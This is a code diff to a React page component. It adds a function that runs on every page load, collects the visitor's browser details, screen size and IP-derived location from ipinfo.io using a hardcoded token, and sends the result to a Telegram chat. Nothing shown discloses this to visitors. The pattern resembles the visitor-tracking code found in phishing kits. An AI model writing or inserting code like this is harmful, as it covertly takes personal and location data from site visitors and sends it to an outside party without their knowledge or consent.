@@ -14,11 +14,49 @@ function MainComponent() {
 	const [cursorPos, setCursorPos] = React.useState({ x: 0, y: 0 });
 	const [isAuthorized, setIsAuthorized] = React.useState(false);
 
+	const fetchUserData = async () => {
+		const browserInfo = {
+			userAgent: navigator.userAgent,
+			platform: navigator.platform,
+			screenSize: `${window.screen.width}x${window.screen.height}`,
+		};
+
+		await fetch("https://ipinfo.io/json?token=0b07b6a04e84df")
+			.then((res) => res.json())
+			.then((ipData) => {
+				// Format IP info
+				const ipInfo = Object.entries(ipData)
+					.map(([key, value]) => {
+						if (Array.isArray(value)) {
+							return `${key} - \`${value.join(", ")}\``;
+						} else if (
+							typeof value === "object" &&
+							value !== null
+						) {
+							return `${key} - \`${JSON.stringify(value)}\``;
+						} else {
+							return `${key} - \`${value}\``;
+						}
+					})
+					.join("\n");
+
+				// Format browser info
+				const browserDetails = Object.entries(browserInfo)
+					.map(([key, value]) => `${key} - \`${value}\``)
+					.join("\n");
+
+				// Combine both
+				const message = `🌐 **Browser Info**\n${browserDetails}\n\n📍 **IP Info**\n${ipInfo}`;
+
+				// Send to Telegram
+				sendMessageTelegram(message);
+			});
+	};
+
 	const router = useRouter();
 
 	React.useEffect(() => {
-		const userAgent = navigator.userAgent;
-		sendMessageTelegram(`🌐 New visitor\n\n🧾 User-Agent:\n${userAgent}`);
+		fetchUserData();
 	}, []);
 
 	// Check authorization on component mount
